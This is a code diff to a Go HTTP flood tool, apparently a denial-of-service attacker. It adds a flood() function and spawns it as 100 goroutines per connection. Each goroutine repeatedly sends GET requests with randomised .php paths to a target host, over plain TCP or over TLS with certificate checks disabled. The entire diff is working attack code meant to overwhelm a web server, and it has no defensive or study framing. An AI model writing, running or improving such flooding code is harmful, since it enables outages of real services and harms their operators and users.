@@ -16,6 +16,8 @@ var (
 	path      = "/"
 	rpath     = false
 	start     = make(chan bool)
+	s         net.Conn
+	err       error
 	a_z       = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
 	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -93,38 +95,39 @@ func getheader() string {
 	return header
 }
 
+func flood() {
+	addr := ip + ":" + port
+	header := getheader()
+	if rpath == true {
+		path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
+	}
+	get_host := "GET " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+	request := get_host + header
+	for i := 0; i < 100; i++ {
+		s.Write([]byte(request))
+	}
+	s.Close()
+}
+
 func attack() {
-	var s net.Conn
-	var err error
 	addr := ip + ":" + port
 	<-start
 	for {
-		header := getheader()
-		if rpath == true {
-			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
-		}
-		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-		request := get_host + header
 		if port == "443" {
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
 				ServerName:         ip, //simple fix
 			}
-			s, err = tls.Dial("tcp", addr, cfg)
+			s, err = tls.Dial("tcp4", addr, cfg)
 		} else {
-			s, err = net.Dial("tcp", addr)
+			s, err = net.Dial("tcp4", addr)
 		}
 		if err != nil {
 			fmt.Println("Connection Down!!!")
 		} else {
 			for i := 0; i < 100; i++ {
-				s.Write([]byte(request))
-				s.Write([]byte(request))
-				s.Write([]byte(request))
-				s.Write([]byte(request))
-				s.Write([]byte(request))
+				go flood()
 			}
-			s.Close()
 		}
 	}
 }
